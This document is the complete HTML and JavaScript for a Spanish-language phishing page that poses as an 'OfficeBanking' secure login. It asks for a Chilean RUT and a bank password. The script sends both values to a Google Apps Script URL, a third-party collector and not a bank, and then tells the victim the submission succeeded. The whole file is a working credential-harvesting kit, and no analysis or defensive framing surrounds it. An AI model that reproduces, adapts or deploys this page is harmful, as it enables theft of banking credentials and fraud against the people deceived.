<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>OfficeBanking - Ingreso Seguro</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f2f5f7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .formulario {
      background-color: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 380px;
    }

    .formulario h2 {
      text-align: center;
      color: #0072bb;
      margin-bottom: 20px;
    }

    .formulario input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccd1d9;
      border-radius: 5px;
      font-size: 16px;
    }

    .formulario button {
      width: 100%;
      padding: 12px;
      background-color: #0072bb;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    .formulario button:disabled {
      background-color: #88bde0;
      cursor: not-allowed;
    }

    #cargando, #mensaje {
      text-align: center;
      margin-top: 15px;
      display: none;
    }

    #cargando { color: #777; }
    #mensaje { color: green; }
  </style>
</head>
<body>
  <div class="formulario">
    <h2>Acceso Seguro</h2>
    <form id="formulario">
      <input type="text" name="rut" placeholder="Ingresa tu RUT" required />
      <input type="password" name="clave" placeholder="Ingresa tu Clave" required />
      <button type="submit">Ingresar</button>
      <div id="cargando">CARGANDO...</div>
      <div id="mensaje">¡Enviado correctamente!</div>
    </form>
  </div>

  <script>
    const form = document.getElementById("formulario");
    const cargando = document.getElementById("cargando");
    const mensaje = document.getElementById("mensaje");

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      cargando.style.display = "block";
      mensaje.style.display = "none";
      form.querySelector("button").disabled = true;

      const datos = new URLSearchParams();
      datos.append("rut", form.rut.value);
      datos.append("clave", form.clave.value);

      fetch("https://script.google.com/macros/s/AKfycbwnIB8we8POlSKsIr2URrZixdYNV1PPLQIwDE2XoCe_mLIT3wcO91Z1vMer-Q6ZKM_k5A/exec", {
        method: "POST",
        body: datos
      })
      .then(() => {
        cargando.style.display = "none";
        mensaje.style.display = "block";
        form.reset();
        form.querySelector("button").disabled = false;
      })
      .catch(error => {
        cargando.style.display = "none";
        alert("Ocurrió un error al enviar. Intenta nuevamente.");
        form.querySelector("button").disabled = false;
        console.error("Error:", error);
      });
    });
  </script>
</body>
</html>
